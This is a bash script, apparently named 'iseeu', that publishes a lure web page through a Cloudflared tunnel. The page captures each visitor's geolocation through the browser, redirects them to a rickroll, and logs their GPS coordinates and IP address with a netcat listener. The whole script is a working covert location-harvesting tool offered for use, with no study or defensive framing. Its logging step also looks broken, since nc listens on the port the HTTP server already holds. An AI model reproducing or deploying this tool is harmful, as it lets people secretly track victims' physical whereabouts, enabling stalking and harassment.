#!/bin/bash

clear

# Prompt for port
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TMP_LOG="$(mktemp)"  # Temporary Cloudflared output
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null

mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
cd "$WEB_DIR" || exit 1

echo "[*] Creating minimal HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>I See You</title>
    <script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch(\`/logme/\${pos.coords.latitude},\${pos.coords.longitude}\`);
            location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
        }, () => alert("Location access denied."));
    </script>
</head>
<body><h1>Loading...</h1></body>
</html>
EOF

echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" > "$TMP_LOG" 2>&1 &
CF_PID=$!

# Wait for URL
echo -n "[*] Waiting for Cloudflared URL"
for i in {1..15}; do
    sleep 1
    echo -n "."
    URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" "$TMP_LOG" | head -n1)
    if [[ -n "$URL" ]]; then break; fi
done
echo

if [[ -n "$URL" ]]; then
    echo "[✓] Public URL: $URL"
else
    echo "[✗] Failed to get public URL."
    kill $SERVER_PID $CF_PID 2>/dev/null
    rm -f "$TMP_LOG"
    exit 1
fi

echo "[*] Logging to $LOG_FILE..."

# Mini listener for location logs
while true; do
    nc -l -p "$PORT" | while read line; do
        if [[ "$line" == *"/logme/"* ]]; then
            GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
            IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
        fi
    done
done &

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID 2>/dev/null; rm -f "$TMP_LOG"; echo "[*] Done."' EXIT
echo "[*] Press Ctrl+C to stop."

wait